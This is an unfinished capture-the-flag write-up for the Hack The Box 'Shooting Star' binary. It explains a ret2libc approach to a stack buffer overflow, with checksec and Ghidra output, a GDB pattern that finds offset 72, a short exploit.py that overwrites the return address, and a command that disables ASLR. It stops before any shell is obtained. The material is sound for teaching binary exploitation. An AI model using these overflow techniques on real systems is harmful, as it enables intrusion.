# Shooting star Write up

We are very screwed, but here we go! Check file.

# File analysis

```shell
file shooting_star                                                                                                                   main 
shooting_star: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=78179254768c1362423b4d4b124ff480b059febe, for GNU/Linux 3.2.0, not stripped
```
Check security:
```shell
checksec --file=./shooting_star                                                                                                                                                  main 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  Symbols     FORTIFY Fortified   Fortifiable FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   67 Symbols   No 0       1       ./shooting_star
```

We cannot point an arbitraty address into Instruction Pointer (IP) to run our shellcode from that address.
This will fail, because there is no execution of shellcode when NX bit is enabled. So, we'll try to ret2libc methodology

# METHODOLOGY
Whenever a function is called by a program, the arguments required for this function are loaded into stack so that it can be pointed by Base Pointer(BP) easily to process the instructions.
The common way to bypass NX bit protection is to try ret2libc attack
In this attack, we would be loading the function arguments directly into stack so that it can be called by other function we need.

# WORKING MECHANISM

So in order to make this work,

    1. We would be passing our arguments of the function into the stack by loading it into buffer space
    2. Pointing our Instruction Pointer(IP) to another function which uses our passed inputs as arguments
    3. Return function to execute when the program comes out of the pointed function

# WHAT TYPE OF FUNCTIONS NEED TO BE POINTED

Reusable functions need to be pointed in Instruction Pointer (IP)
These functions can be inbuilt in the program or it can be called from libraries
For ret2libc, the function should be from LIBC

# EXPLOITATION

In Ret2Libc attack we will be pointing functions from LIBC library
That is how this attack got its name, “ret2libc”
When it comes to LIBC, each function inside this library is present at fixed offset from the base of the library
If library version and library base value address is known,we can calculate address of any function from it easily
To calculate the function address in LIBC , [Click Here](https://libc.blukat.me/)

# SPAWNING SHELL USING RET2LIBC

First of all, execute program to view basic workflow:
Execute file:  
```shell
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                      main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> be happy

May your wish come true!
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                26   main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> happiness and health for my daughter

May your wish come true!
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                26   main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 2
Isn't the sky amazing?!
 …  hackthebox  ShootingStar  Files  ./shooting_star                                                                                                                24   main 
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 3
A star is an astronomical object consisting of a luminous spheroid of plasma held together by its own gravity. The nearest star to Earth is the Sun. Many other stars are visible to the naked eye from Earth during the night, appearing as a multitude of fixed luminous points in the sky due to their immense distance from Earth. Historically, the most prominent stars were grouped into constellations and asterisms, the brightest of which gained proper names. Astronomers have assembled star catalogues that identify the known stars and provide standardized stellar designations.
 …  hackthebox  ShootingStar  Files          
```

After take a look con ghidra code, we are interesting on buffer overflow from star function (option 1: Make a wish) and may use write from libc function:
```python
void star(void)

{
  char local_4a [2];
  undefined local_48 [64];
  
  read(0,local_4a,2);
  if (local_4a[0] == '1') {
    write(1,&DAT_00402008,3);
    read(0,local_48,0x200);
    write(1,"\nMay your wish come true!\n",0x1a);
  }
  else if (local_4a[0] == '2') {
    write(1,"Isn\'t the sky amazing?!\n",0x18);
  }
  else if (local_4a[0] == '3') {
    write(1,
          "A star is an astronomical object consisting of a luminous spheroid of plasma held togethe r by its own gravity. The nearest star to Earth is the Sun. Many other stars are visible t o the naked eye from Earth during the night, appearing as a multitude of fixed luminous po ints in the sky due to their immense distance from Earth. Historically, the most prominent  stars were grouped into constellations and asterisms, the brightest of which gained prope r names. Astronomers have assembled star catalogues that identify the known stars and prov ide standardized stellar designations.\n"
          ,0x242);
  }
  return;
}
```

We'll try to overflow undefined local_48 [64]; on read.

# Disabling ASLR
As before, we don't want the added complexity of Address Space Layout Randomization for this project, so we'll turn it off.
In a Terminal window, execute this command: 

```shell
echo 0 > /proc/sys/kernel/randomize_va_space 
```
# FINDING OFFSET

Now, let's search offset with GDB PEDA, execute shooting_star with gdb:

```shell
gdb ./shooting_star                                                                                                                                                   main 
gdb-peda$
```
Create patter with 85 chars, run program and pass this pattern to read on star function:
```shell
gdb-peda$ pattern create 85
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAf'
gdb-peda$ run
Starting program: /home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
🌠 A shooting star!!
1. Make a wish!
2. Stare at the stars.
3. Learn about the stars.
> 1
>> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAf
[----------------------------------registers-----------------------------------]
RAX: 0x1a
RBX: 0x7fffffffe6d8 --> 0x7fffffffe9db ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
RCX: 0x7ffff7ea30b4 (<write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x1a
RSI: 0x40200c ("\nMay your wish come true!\n")
RDI: 0x1
RBP: 0x4141334141644141 ('AAdAA3AA')
RSP: 0x7fffffffe5b8 ("IAAeAA4AAJAAf\n")
RIP: 0x4011ec (<star+170>:  ret)
R8 : 0x4012d0 (<__libc_csu_fini>:   ret)
R9 : 0x7ffff7fce890 (endbr64)
R10: 0x3
R11: 0x202
R12: 0x0
R13: 0x7fffffffe6e8 --> 0x7fffffffea29 ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011e5 <star+163>: call   0x401030 <write@plt>
   0x4011ea <star+168>: nop
   0x4011eb <star+169>: leave
=> 0x4011ec <star+170>: ret
   0x4011ed <setup>:    push   rbp
   0x4011ee <setup+1>:  mov    rbp,rsp
   0x4011f1 <setup+4>:  mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
   0x4011f8 <setup+11>: mov    ecx,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe5b8 ("IAAeAA4AAJAAf\n")
0008| 0x7fffffffe5c0 --> 0xa6641414a41 ('AJAAf\n')
0016| 0x7fffffffe5c8 --> 0x7ffff7dcf290 (mov    edi,eax)
0024| 0x7fffffffe5d0 --> 0x7fffffffe6c0 --> 0x7fffffffe6c8 --> 0x38 ('8')
0032| 0x7fffffffe5d8 --> 0x401230 (<main>:  push   rbp)
0040| 0x7fffffffe5e0 --> 0x100400040
0048| 0x7fffffffe5e8 --> 0x7fffffffe6d8 --> 0x7fffffffe9db ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
0056| 0x7fffffffe5f0 --> 0x7fffffffe6d8 --> 0x7fffffffe9db ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ec in star ()
```
Search offset:

```shell
gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 64
Registers point to pattern buffer:
[RSP] --> offset 72 - size ~15
Pattern buffer found at:
0x00007fffffffe570 : offset    0 - size   85 ($sp + -0x48 [-18 dwords])
Reference to pattern buffer not found in memory
gdb-peda$
```

Offset seems to be 72

# CONTROLLING INSTRUCTION POINTER

Lets craft an input data in python to test whether we can overwrite the Instruction Pointer (IP) correctly or not. Starting create basic exploit.py file as follow:

```python
#!/usr/bin/python
import struct

menu_option = "1"
offset = b"A" * 72

print(menu_option)
print(offset + b"B" * 4)
```

Execute script and redirect to file:

```shell
./exploit.py > file
cat ./file
1
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'
```

Pass file as argument on gdb:
```shell
gdb ./shooting_star                                                                                                                                                                main 
gdb-peda$ run < file

```



TO BE CONTINUED...

[Reference guide](https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3)

CHALLENGE DESCRIPTION

Tired of exploring the never-ending world, you lie down and enjoy the crystal clear sky. Over a million stars above your head! Enjoy the silence and the glorious stars while you rest.
